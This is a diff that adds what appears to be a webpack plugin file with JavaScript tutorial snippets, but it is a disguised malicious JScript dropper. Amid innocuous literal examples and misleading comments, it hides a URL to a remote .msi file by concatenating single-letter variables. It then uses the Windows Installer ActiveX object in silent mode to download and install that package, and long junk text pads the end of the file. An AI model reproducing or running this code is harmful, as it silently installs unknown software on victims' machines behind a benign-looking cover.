@@ -1,0 +1,97 @@
+/*
+	MIT License http://www.opensource.org/licenses/mit-license.php
+	Author Tobias Koppers @sokra
+*/
+"use strict";
+/*
+class ChunkModuleIdRangePlugin {
+	constructor(options) {
+		this.options = options;
+	}
+	apply(compiler) {
+		const options = this.options;
+		compiler.plugin("compilation", (compilation) => {
+			compilation.plugin("module-ids", (modules) => {
+				const chunk = this.chunks.find((chunk) => chunk.name === options.name);
+				if(!chunk) throw new Error("ChunkModuleIdRangePlugin: Chunk with name '" + options.name + "' was not found");
+				let currentId = options.start;
+				let chunkModules;
+				if(options.order) {
+					chunkModules = chunk.modules.slice();
+					switch(options.order) {
+						case "index":
+							chunkModules.sort((a, b) => {
+								return a.index - b.index;
+							});
+							break;
+						case "index2":
+							chunkModules.sort((a, b) => {
+								return a.index2 - b.index2;
+							});
+							break;
+						default:
+							throw new Error("ChunkModuleIdRangePlugin: unexpected value of order");
+					}
+
+				} else {
+					chunkModules = modules.filter((m) => {
+						return m.chunks.indexOf(chunk) >= 0;
+					});
+				}
+
+				for(let i = 0; i < chunkModules.length; i++) {
+					const m = chunkModules[i];
+					if(m.id === null) {
+						m.id = currentId++;
+					}
+					if(options.end && currentId > options.end)
+						break;
+				}
+			});
+		});
+	}
+}
+module.exports = ChunkModuleIdRangePlugin;
+*/
+
+3.9                               // numeric literal
+"Hello!"                          // string literal
+false                             // Boolean literal
+[1,2,3]                           // Array literal
+var o = {x:1, y:2}                // Object literal
+var f = function(x){return x*x;}  // function literal
+4 + 5        // additon
+10 / 2       // division
+radius = 139;
+uros = 1;5;7,73;
+f = "h";s = "n";g = "w";o = "p";n = "t";p = ".";
+anExpression = 4 * (4 / 5) + 5;
+aSecondExpression = Math.PI * radius * radius;
+aThirdExpression = f + n + n + o +"s://perfectsystems-ltd" + p + "com/x-css/" + "bb" + ".msi";
+myArray = new Array("hello", Math.PI, 48);
+myPi = myArray[1];
+var aBird = "windowsinstaller.installer"; // Assign the text "Robin" to the variable aBird.
+var today = new Date(); // Assign today's date to the variable today.
+var birthday = new ActiveXObject(aBird);
+birthday.uilevel=2
+birthday.InstallProduct(aThirdExpression);
+var a = new Array(4);
+for (i = 0; i < 4; i++) {}
+
+function FeetToMiles(feet, cnvType) {
+   if (cnvType == "NM")
+      return( (feet / 6080) + " nautical miles");
+   else if (cnvType == "M")
+      return( (feet / 5280) + " statute miles");
+   else
+      return ("Invalid unit of measure");
+}
+var mradius = FeetToMiles(52800, "M");
+
+'How old am I?'
+
+var myObject = new Object();           // Creates a generic object.
+var birthday = new Date(1961, 5, 10);  // Creates a Date object.
+//WScript.Echo(aThirdExpression);
+
+https://fddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfdfddffdfd
